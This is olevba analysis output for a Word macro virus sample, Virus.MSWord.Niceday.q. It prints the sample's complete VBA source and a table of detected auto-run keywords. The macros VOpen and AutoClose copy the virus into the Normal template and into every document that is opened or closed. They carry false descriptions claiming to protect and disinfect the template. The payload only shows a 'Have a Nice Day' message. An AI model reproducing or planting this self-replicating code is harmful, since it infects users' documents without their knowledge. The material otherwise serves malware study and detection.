olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Niceday.q
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Niceday.q - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Payload.bas 
in file: Virus.MSWord.Niceday.q - OLE stream: 'Macros/VBA/Payload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit


Public Sub MAIN()
Attribute MAIN.VB_Description = "Null macro to prevent prank macros from re-installing.  Do not delete."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Payload.MAIN"
    Rem That's enough to prove my point
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExit.bas 
in file: Virus.MSWord.Niceday.q - OLE stream: 'Macros/VBA/AutoExit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit


Rem Concept3.AutoExit.Macro
Public Sub MAIN()
Attribute MAIN.VB_Description = "ScanProt macro to protect and disinfect your Normal (Global) template."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExit.MAIN"
Dim message1$
Dim daynumber
Dim monthnumber
message1$ = "Have a Nice Day !"

daynumber = WordBasic.Day(WordBasic.Now())
monthnumber = WordBasic.Month(WordBasic.Now())

If daynumber = 1 And monthnumber = 4 Then WordBasic.MsgBox message1$ Else WordBasic.MsgBox message1$

End Sub
-------------------------------------------------------------------------------
VBA MACRO VOpen.bas 
in file: Virus.MSWord.Niceday.q - OLE stream: 'Macros/VBA/VOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit


Public Sub MAIN()
Attribute MAIN.VB_Description = "Runs AutoOpenScan"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim vZap$
Dim vMacro$
    On Error GoTo -1: On Error GoTo Abort
    
            vZap$ = WordBasic.[FileName$]()

            vMacro$ = vZap$ + ":Payload"
            WordBasic.MacroCopy vMacro$, "Global:PayLoad"

            vMacro$ = vZap$ + ":AutoExit"
            WordBasic.MacroCopy vMacro$, "Global:AutoExit"

            vMacro$ = vZap$ + ":AutoOpen"
            WordBasic.MacroCopy vMacro$, "Global:VOpen"

            vMacro$ = vZap$ + ":VClose"
            WordBasic.MacroCopy vMacro$, "Global:AutoClose"

Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Niceday.q - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit


Public Sub MAIN()
Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.VClose.MAIN"
Dim vZap$
Dim vMacro$
    On Error GoTo -1: On Error GoTo Abort

        WordBasic.FileSaveAs Format:=1

        vZap$ = WordBasic.[FileName$]()

        vMacro$ = vZap$ + ":Payload"
        WordBasic.MacroCopy "Global:PayLoad", vMacro$

        vMacro$ = vZap$ + ":AutoExit"
        WordBasic.MacroCopy "Global:AutoExit", vMacro$

        vMacro$ = vZap$ + ":AutoOpen"
        WordBasic.MacroCopy "Global:VOpen", vMacro$

        vMacro$ = vZap$ + ":VClose"
        WordBasic.MacroCopy "Global:AutoClose", vMacro$

        WordBasic.FileSaveAs Format:=1

Abort:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

